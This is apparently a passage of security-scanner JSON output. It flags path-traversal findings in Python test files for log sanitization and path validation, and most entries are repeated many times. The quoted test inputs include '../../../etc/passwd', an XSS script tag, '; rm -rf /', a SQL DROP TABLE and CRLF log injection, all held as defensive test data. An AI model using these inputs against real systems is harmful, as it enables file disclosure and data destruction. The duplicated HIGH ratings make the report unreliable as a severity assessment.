            "context": "        \"2024-01-01 00:00:00 ERROR Fake log entry\",\n        \"User query: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(malicious_code)\",\n        \"JSON: {\\\"level\\\":\\\"ERROR\\\",\\\"message\\\":\\\"fake\\\"}\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 87,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path: ../../../etc/passwd\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log entry\",\n        \"User query: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(malicious_code)\",\n        \"JSON: {\\\"level\\\":\\\"ERROR\\\",\\\"message\\\":\\\"fake\\\"}\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 87,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path: ../../../etc/passwd\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log entry\",\n        \"User query: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(malicious_code)\",\n        \"JSON: {\\\"level\\\":\\\"ERROR\\\",\\\"message\\\":\\\"fake\\\"}\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 87,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path: ../../../etc/passwd\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log entry\",\n        \"User query: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(malicious_code)\",\n        \"JSON: {\\\"level\\\":\\\"ERROR\\\",\\\"message\\\":\\\"fake\\\"}\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 87,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path: ../../../etc/passwd\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log entry\",\n        \"User query: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(malicious_code)\",\n        \"JSON: {\\\"level\\\":\\\"ERROR\\\",\\\"message\\\":\\\"fake\\\"}\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 182,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"user_input\": \"../../../etc/passwd\"",
            "context": "            \"list_items\": [\"item1\\r\\n\", \"item2\\n\", \"item3\"]\n        },\n        \"user_input\": \"../../../etc/passwd\"\n    }\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 182,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"user_input\": \"../../../etc/passwd\"",
            "context": "            \"list_items\": [\"item1\\r\\n\", \"item2\\n\", \"item3\"]\n        },\n        \"user_input\": \"../../../etc/passwd\"\n    }\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 182,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"user_input\": \"../../../etc/passwd\"",
            "context": "            \"list_items\": [\"item1\\r\\n\", \"item2\\n\", \"item3\"]\n        },\n        \"user_input\": \"../../../etc/passwd\"\n    }\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 182,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"user_input\": \"../../../etc/passwd\"",
            "context": "            \"list_items\": [\"item1\\r\\n\", \"item2\\n\", \"item3\"]\n        },\n        \"user_input\": \"../../../etc/passwd\"\n    }\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 182,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"user_input\": \"../../../etc/passwd\"",
            "context": "            \"list_items\": [\"item1\\r\\n\", \"item2\\n\", \"item3\"]\n        },\n        \"user_input\": \"../../../etc/passwd\"\n    }\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 182,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"user_input\": \"../../../etc/passwd\"",
            "context": "            \"list_items\": [\"item1\\r\\n\", \"item2\\n\", \"item3\"]\n        },\n        \"user_input\": \"../../../etc/passwd\"\n    }\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 238,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path traversal: ../../../etc/passwd\",",
            "context": "            \"Injection attempt\\r\\n2024-01-01 ERROR FAKE LOG\",\n            \"User input: <script>alert('xss')</script>\",\n            \"Path traversal: ../../../etc/passwd\",\n            \"Command injection: ; rm -rf /\",\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 238,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path traversal: ../../../etc/passwd\",",
            "context": "            \"Injection attempt\\r\\n2024-01-01 ERROR FAKE LOG\",\n            \"User input: <script>alert('xss')</script>\",\n            \"Path traversal: ../../../etc/passwd\",\n            \"Command injection: ; rm -rf /\",\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 238,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path traversal: ../../../etc/passwd\",",
            "context": "            \"Injection attempt\\r\\n2024-01-01 ERROR FAKE LOG\",\n            \"User input: <script>alert('xss')</script>\",\n            \"Path traversal: ../../../etc/passwd\",\n            \"Command injection: ; rm -rf /\",\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 238,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path traversal: ../../../etc/passwd\",",
            "context": "            \"Injection attempt\\r\\n2024-01-01 ERROR FAKE LOG\",\n            \"User input: <script>alert('xss')</script>\",\n            \"Path traversal: ../../../etc/passwd\",\n            \"Command injection: ; rm -rf /\",\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 238,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path traversal: ../../../etc/passwd\",",
            "context": "            \"Injection attempt\\r\\n2024-01-01 ERROR FAKE LOG\",\n            \"User input: <script>alert('xss')</script>\",\n            \"Path traversal: ../../../etc/passwd\",\n            \"Command injection: ; rm -rf /\",\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 238,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path traversal: ../../../etc/passwd\",",
            "context": "            \"Injection attempt\\r\\n2024-01-01 ERROR FAKE LOG\",\n            \"User input: <script>alert('xss')</script>\",\n            \"Path traversal: ../../../etc/passwd\",\n            \"Command injection: ; rm -rf /\",\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 310,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "test_resource = \"../../../etc/passwd\"",
            "context": "        # Test with injection attempts\n        test_user_id = \"admin\\r\\nFAKE: Injected log entry\"\n        test_resource = \"../../../etc/passwd\"\n        test_details = {\n            \"user_input\": \"SELECT * FROM users; DROP TABLE users;\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 310,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "test_resource = \"../../../etc/passwd\"",
            "context": "        # Test with injection attempts\n        test_user_id = \"admin\\r\\nFAKE: Injected log entry\"\n        test_resource = \"../../../etc/passwd\"\n        test_details = {\n            \"user_input\": \"SELECT * FROM users; DROP TABLE users;\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 310,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "test_resource = \"../../../etc/passwd\"",
            "context": "        # Test with injection attempts\n        test_user_id = \"admin\\r\\nFAKE: Injected log entry\"\n        test_resource = \"../../../etc/passwd\"\n        test_details = {\n            \"user_input\": \"SELECT * FROM users; DROP TABLE users;\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 310,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "test_resource = \"../../../etc/passwd\"",
            "context": "        # Test with injection attempts\n        test_user_id = \"admin\\r\\nFAKE: Injected log entry\"\n        test_resource = \"../../../etc/passwd\"\n        test_details = {\n            \"user_input\": \"SELECT * FROM users; DROP TABLE users;\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 310,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "test_resource = \"../../../etc/passwd\"",
            "context": "        # Test with injection attempts\n        test_user_id = \"admin\\r\\nFAKE: Injected log entry\"\n        test_resource = \"../../../etc/passwd\"\n        test_details = {\n            \"user_input\": \"SELECT * FROM users; DROP TABLE users;\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 310,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "test_resource = \"../../../etc/passwd\"",
            "context": "        # Test with injection attempts\n        test_user_id = \"admin\\r\\nFAKE: Injected log entry\"\n        test_resource = \"../../../etc/passwd\"\n        test_details = {\n            \"user_input\": \"SELECT * FROM users; DROP TABLE users;\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 24,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),",
            "context": "        (\"/etc/passwd\", None, False, True, \"Absolute path when not allowed\"),\n        (\"/etc/passwd\", None, True, False, \"Absolute path when allowed\"),\n        (\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),\n        (\"..\\\\..\\\\..\\\\windows\\\\system32\", None, False, True, \"Windows directory traversal\"),\n        (\"file\\x00name.txt\", None, False, True, \"Null byte in filename\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 24,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),",
            "context": "        (\"/etc/passwd\", None, False, True, \"Absolute path when not allowed\"),\n        (\"/etc/passwd\", None, True, False, \"Absolute path when allowed\"),\n        (\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),\n        (\"..\\\\..\\\\..\\\\windows\\\\system32\", None, False, True, \"Windows directory traversal\"),\n        (\"file\\x00name.txt\", None, False, True, \"Null byte in filename\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 24,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),",
            "context": "        (\"/etc/passwd\", None, False, True, \"Absolute path when not allowed\"),\n        (\"/etc/passwd\", None, True, False, \"Absolute path when allowed\"),\n        (\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),\n        (\"..\\\\..\\\\..\\\\windows\\\\system32\", None, False, True, \"Windows directory traversal\"),\n        (\"file\\x00name.txt\", None, False, True, \"Null byte in filename\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 24,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),",
            "context": "        (\"/etc/passwd\", None, False, True, \"Absolute path when not allowed\"),\n        (\"/etc/passwd\", None, True, False, \"Absolute path when allowed\"),\n        (\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),\n        (\"..\\\\..\\\\..\\\\windows\\\\system32\", None, False, True, \"Windows directory traversal\"),\n        (\"file\\x00name.txt\", None, False, True, \"Null byte in filename\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 24,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),",
            "context": "        (\"/etc/passwd\", None, False, True, \"Absolute path when not allowed\"),\n        (\"/etc/passwd\", None, True, False, \"Absolute path when allowed\"),\n        (\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),\n        (\"..\\\\..\\\\..\\\\windows\\\\system32\", None, False, True, \"Windows directory traversal\"),\n        (\"file\\x00name.txt\", None, False, True, \"Null byte in filename\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 24,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),",
            "context": "        (\"/etc/passwd\", None, False, True, \"Absolute path when not allowed\"),\n        (\"/etc/passwd\", None, True, False, \"Absolute path when allowed\"),\n        (\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),\n        (\"..\\\\..\\\\..\\\\windows\\\\system32\", None, False, True, \"Windows directory traversal\"),\n        (\"file\\x00name.txt\", None, False, True, \"Null byte in filename\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 24,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),",
            "context": "        (\"/etc/passwd\", None, False, True, \"Absolute path when not allowed\"),\n        (\"/etc/passwd\", None, True, False, \"Absolute path when allowed\"),\n        (\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),\n        (\"..\\\\..\\\\..\\\\windows\\\\system32\", None, False, True, \"Windows directory traversal\"),\n        (\"file\\x00name.txt\", None, False, True, \"Null byte in filename\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 24,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),",
            "context": "        (\"/etc/passwd\", None, False, True, \"Absolute path when not allowed\"),\n        (\"/etc/passwd\", None, True, False, \"Absolute path when allowed\"),\n        (\"../../../etc/passwd\", None, False, True, \"Directory traversal with ../\"),\n        (\"..\\\\..\\\\..\\\\windows\\\\system32\", None, False, True, \"Windows directory traversal\"),\n        (\"file\\x00name.txt\", None, False, True, \"Null byte in filename\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 76,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../etc/passwd\", None, False, \"Directory traversal\"),",
            "context": "    safe_test_cases = [\n        (\"normal.txt\", None, True, \"Normal file\"),\n        (\"../etc/passwd\", None, False, \"Directory traversal\"),\n        (\"con\", None, False, \"Reserved name\"),\n    ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 76,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../etc/passwd\", None, False, \"Directory traversal\"),",
            "context": "    safe_test_cases = [\n        (\"normal.txt\", None, True, \"Normal file\"),\n        (\"../etc/passwd\", None, False, \"Directory traversal\"),\n        (\"con\", None, False, \"Reserved name\"),\n    ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", \"passwd\", \"Path traversal\"),",
            "context": "    sanitize_test_cases = [\n        (\"normal.txt\", \"normal.txt\", \"Normal filename\"),\n        (\"../../../etc/passwd\", \"passwd\", \"Path traversal\"),\n        (\"file:with*special?chars.txt\", \"file_with_special_chars.txt\", \"Special characters\"),\n        (\"con.txt\", \"con.txt\", \"Reserved name (sanitize doesn't check reserved)\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", \"passwd\", \"Path traversal\"),",
            "context": "    sanitize_test_cases = [\n        (\"normal.txt\", \"normal.txt\", \"Normal filename\"),\n        (\"../../../etc/passwd\", \"passwd\", \"Path traversal\"),\n        (\"file:with*special?chars.txt\", \"file_with_special_chars.txt\", \"Special characters\"),\n        (\"con.txt\", \"con.txt\", \"Reserved name (sanitize doesn't check reserved)\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", \"passwd\", \"Path traversal\"),",
            "context": "    sanitize_test_cases = [\n        (\"normal.txt\", \"normal.txt\", \"Normal filename\"),\n        (\"../../../etc/passwd\", \"passwd\", \"Path traversal\"),\n        (\"file:with*special?chars.txt\", \"file_with_special_chars.txt\", \"Special characters\"),\n        (\"con.txt\", \"con.txt\", \"Reserved name (sanitize doesn't check reserved)\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", \"passwd\", \"Path traversal\"),",
            "context": "    sanitize_test_cases = [\n        (\"normal.txt\", \"normal.txt\", \"Normal filename\"),\n        (\"../../../etc/passwd\", \"passwd\", \"Path traversal\"),\n        (\"file:with*special?chars.txt\", \"file_with_special_chars.txt\", \"Special characters\"),\n        (\"con.txt\", \"con.txt\", \"Reserved name (sanitize doesn't check reserved)\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", \"passwd\", \"Path traversal\"),",
            "context": "    sanitize_test_cases = [\n        (\"normal.txt\", \"normal.txt\", \"Normal filename\"),\n        (\"../../../etc/passwd\", \"passwd\", \"Path traversal\"),\n        (\"file:with*special?chars.txt\", \"file_with_special_chars.txt\", \"Special characters\"),\n        (\"con.txt\", \"con.txt\", \"Reserved name (sanitize doesn't check reserved)\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", \"passwd\", \"Path traversal\"),",
            "context": "    sanitize_test_cases = [\n        (\"normal.txt\", \"normal.txt\", \"Normal filename\"),\n        (\"../../../etc/passwd\", \"passwd\", \"Path traversal\"),\n        (\"file:with*special?chars.txt\", \"file_with_special_chars.txt\", \"Special characters\"),\n        (\"con.txt\", \"con.txt\", \"Reserved name (sanitize doesn't check reserved)\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 127,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", True, \"Directory traversal attempt\"),",
            "context": "        test_cases = [\n            (str(safe_file), False, \"Safe file in working directory\"),\n            (\"../../../etc/passwd\", True, \"Directory traversal attempt\"),\n            (str(Path(tmpdir) / \"..\" / \"outside.txt\"), True, \"Path outside working directory\"),\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 127,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", True, \"Directory traversal attempt\"),",
            "context": "        test_cases = [\n            (str(safe_file), False, \"Safe file in working directory\"),\n            (\"../../../etc/passwd\", True, \"Directory traversal attempt\"),\n            (str(Path(tmpdir) / \"..\" / \"outside.txt\"), True, \"Path outside working directory\"),\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 127,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", True, \"Directory traversal attempt\"),",
            "context": "        test_cases = [\n            (str(safe_file), False, \"Safe file in working directory\"),\n            (\"../../../etc/passwd\", True, \"Directory traversal attempt\"),\n            (str(Path(tmpdir) / \"..\" / \"outside.txt\"), True, \"Path outside working directory\"),\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 127,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", True, \"Directory traversal attempt\"),",
            "context": "        test_cases = [\n            (str(safe_file), False, \"Safe file in working directory\"),\n            (\"../../../etc/passwd\", True, \"Directory traversal attempt\"),\n            (str(Path(tmpdir) / \"..\" / \"outside.txt\"), True, \"Path outside working directory\"),\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 127,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", True, \"Directory traversal attempt\"),",
            "context": "        test_cases = [\n            (str(safe_file), False, \"Safe file in working directory\"),\n            (\"../../../etc/passwd\", True, \"Directory traversal attempt\"),\n            (str(Path(tmpdir) / \"..\" / \"outside.txt\"), True, \"Path outside working directory\"),\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 127,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", True, \"Directory traversal attempt\"),",
            "context": "        test_cases = [\n            (str(safe_file), False, \"Safe file in working directory\"),\n            (\"../../../etc/passwd\", True, \"Directory traversal attempt\"),\n            (str(Path(tmpdir) / \"..\" / \"outside.txt\"), True, \"Path outside working directory\"),\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 162,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),",
            "context": "        test_cases = [\n            (str(safe_file), \"safe-name.txt\", False, \"Safe file and remote path\"),\n            (\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),\n            (str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 162,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),",
            "context": "        test_cases = [\n            (str(safe_file), \"safe-name.txt\", False, \"Safe file and remote path\"),\n            (\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),\n            (str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 162,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),",
            "context": "        test_cases = [\n            (str(safe_file), \"safe-name.txt\", False, \"Safe file and remote path\"),\n            (\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),\n            (str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 162,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),",
            "context": "        test_cases = [\n            (str(safe_file), \"safe-name.txt\", False, \"Safe file and remote path\"),\n            (\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),\n            (str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 162,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),",
            "context": "        test_cases = [\n            (str(safe_file), \"safe-name.txt\", False, \"Safe file and remote path\"),\n            (\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),\n            (str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 162,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),",
            "context": "        test_cases = [\n            (str(safe_file), \"safe-name.txt\", False, \"Safe file and remote path\"),\n            (\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),\n            (str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 163,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),",
            "context": "            (str(safe_file), \"safe-name.txt\", False, \"Safe file and remote path\"),\n            (\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),\n            (str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 163,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),",
            "context": "            (str(safe_file), \"safe-name.txt\", False, \"Safe file and remote path\"),\n            (\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),\n            (str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 163,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),",
            "context": "            (str(safe_file), \"safe-name.txt\", False, \"Safe file and remote path\"),\n            (\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),\n            (str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 163,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),",
            "context": "            (str(safe_file), \"safe-name.txt\", False, \"Safe file and remote path\"),\n            (\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),\n            (str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 163,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),",
            "context": "            (str(safe_file), \"safe-name.txt\", False, \"Safe file and remote path\"),\n            (\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),\n            (str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "test_path_validation.py",
            "line": 163,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),",
            "context": "            (str(safe_file), \"safe-name.txt\", False, \"Safe file and remote path\"),\n            (\"../../../etc/passwd\", \"passwd\", True, \"Directory traversal in local path\"),\n            (str(safe_file), \"../../../etc/passwd\", False, \"Directory traversal in remote path (should be sanitized)\"),\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_sanitization_simple.py",
            "line": 209,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path: ../../../etc/passwd\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log\",\n        \"User: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(code)\",\n    ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_sanitization_simple.py",
            "line": 209,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path: ../../../etc/passwd\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log\",\n        \"User: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(code)\",\n    ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_sanitization_simple.py",
            "line": 209,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path: ../../../etc/passwd\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log\",\n        \"User: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(code)\",\n    ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_sanitization_simple.py",
            "line": 209,
